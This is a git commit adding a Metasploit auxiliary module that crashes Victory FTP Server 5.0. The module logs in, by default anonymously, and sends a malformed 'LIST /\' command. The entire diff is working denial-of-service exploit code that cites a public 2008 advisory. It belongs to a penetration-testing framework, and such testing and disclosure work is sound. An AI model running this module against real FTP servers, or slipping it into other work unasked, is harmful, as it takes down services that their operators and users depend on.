4740e6e452e642659a1acb4586629e5ba7910f54
kris <>
2008-10-29 21:57:31 +0000

    Adding DoS aux module for the Victory FTP Server v5.0
    git-svn-id: file:///home/svn/framework3/trunk@5801 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/auxiliary/dos/ftp/vicftps50_list.rb
@@ -0,0 +1,39 @@
+require 'msf/core'
+
+class Metasploit3 < Msf::Auxiliary
+
+	include Msf::Exploit::Remote::Ftp
+
+	def initialize(info = {})
+		super(update_info(info,	
+			'Name'           => 'Victory FTP Server 5.0 LIST DoS',
+			'Description'    => %q{
+				The Victory FTP Server v5.0 can be brought down by sending
+				a very simple LIST command
+			},
+			'Author'         => 'Kris Katterjohn <katterjohn@gmail.com>',
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision$',
+			'References'     =>
+				[ [ 'URL', 'http://milw0rm.com/exploits/6834'] ],
+			'DisclosureDate' => 'Oct 24 2008'))
+
+		# They're required
+		register_options([
+			OptString.new('FTPUSER', [ true, 'Valid FTP username', 'anonymous' ]),
+			OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'anonymous' ])
+		])
+	end
+
+	def run
+		return unless connect_login
+
+		print_status("Sending command...")
+
+		# Try to wait for a response
+		raw_send_recv("LIST /\\\r\n")
+
+		disconnect
+	end
+end
+
